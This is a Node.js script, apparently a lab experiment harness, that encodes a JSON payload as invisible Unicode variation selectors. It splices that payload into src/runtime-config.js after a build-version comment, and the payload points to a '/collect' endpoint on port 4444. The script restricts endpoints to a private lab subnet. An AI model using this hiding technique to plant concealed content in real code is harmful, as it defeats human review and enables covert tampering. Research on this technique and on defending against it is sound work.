'use strict';

const fs = require('fs');
const path = require('path');
const crypto = require('crypto');
const os = require('os');
const { URL } = require('url');

const BASELINE_ANCHOR = '// build: v3.0.0 🔧';
const EXPERIMENT_ANCHOR = '// build: v3.0.1 🔧';
const LAB_NET = /^192\.168\.56\.(\d{1,3})$/;

function isAllowedEndpoint(endpoint) {
  try {
    const url = new URL(endpoint);
    if (url.protocol !== 'http:' && url.protocol !== 'https:') return false;
    const match = LAB_NET.exec(url.hostname);
    if (!match) return false;
    const last = Number(match[1]);
    if (last < 0 || last > 255) return false;
    const port = Number(url.port || (url.protocol === 'https:' ? 443 : 80));
    return Number.isInteger(port) && port >= 1 && port <= 65535;
  } catch {
    return false;
  }
}

function byteToSelector(byte) {
  if (byte < 16) return String.fromCodePoint(0xFE00 + byte);
  return String.fromCodePoint(0xE0100 + (byte - 16));
}

function encodePayload(payload) {
  const json = JSON.stringify(payload);
  const bytes = Buffer.from(json, 'utf8');
  let encoded = '';
  for (const byte of bytes) encoded += byteToSelector(byte);
  return { json, bytes, encoded };
}

function sha256(text) {
  return crypto
    .createHash('sha256')
    .update(text, 'utf8')
    .digest('hex')
    .toUpperCase();
}

function getArg(name, fallback) {
  const idx = process.argv.indexOf(name);
  return idx >= 0 && process.argv[idx + 1]
    ? process.argv[idx + 1]
    : fallback;
}

function main() {
  const endpoint = getArg(
    '--endpoint',
    'http://192.168.56.101:4444/collect'
  );
  const marker = getArg('--marker', 'TCC-T13');

  if (!isAllowedEndpoint(endpoint)) {
    throw new Error('endpoint must be HTTP/HTTPS inside 192.168.56.0/24');
  }

  if (!/^[A-Za-z0-9._:-]{1,64}$/.test(marker)) {
    throw new Error('invalid marker');
  }

  const payload = {
    operation: 'system_diagnostics',
    endpoint,
    marker
  };

  const { json, bytes, encoded } = encodePayload(payload);
  const target = path.join(process.cwd(), 'src', 'runtime-config.js');
  const source = fs.readFileSync(target, 'utf8');
  const occurrences = source.split(BASELINE_ANCHOR).length - 1;

  if (occurrences !== 1) {
    throw new Error(`expected exactly one baseline anchor; found ${occurrences}`);
  }

  const next = source.replace(
    BASELINE_ANCHOR,
    EXPERIMENT_ANCHOR + encoded
  );
  fs.writeFileSync(target, next, 'utf8');

  const referenceDir = path.join(os.tmpdir(), 'tcc-t13-reference');
  fs.mkdirSync(referenceDir, { recursive: true });
  const referencePath = path.join(referenceDir, 't13_payload_reference.json');
  fs.writeFileSync(
    referencePath,
    JSON.stringify(payload, null, 2) + '\n',
    'utf8'
  );

  console.log('=== T13 ENCODER ===');
  console.log('payload:', json);
  console.log('bytes UTF-8:', bytes.length);
  console.log('selectors inserted:', [...encoded].length);
  console.log('baseline anchor:', JSON.stringify(BASELINE_ANCHOR));
  console.log('experimental anchor:', JSON.stringify(EXPERIMENT_ANCHOR));
  console.log('metadata SHA256:', sha256(json));
  console.log('reference:', referencePath);
  console.log('target:', target);
}

if (require.main === module) main();

module.exports = {
  BASELINE_ANCHOR,
  EXPERIMENT_ANCHOR,
  byteToSelector,
  encodePayload,
  isAllowedEndpoint
};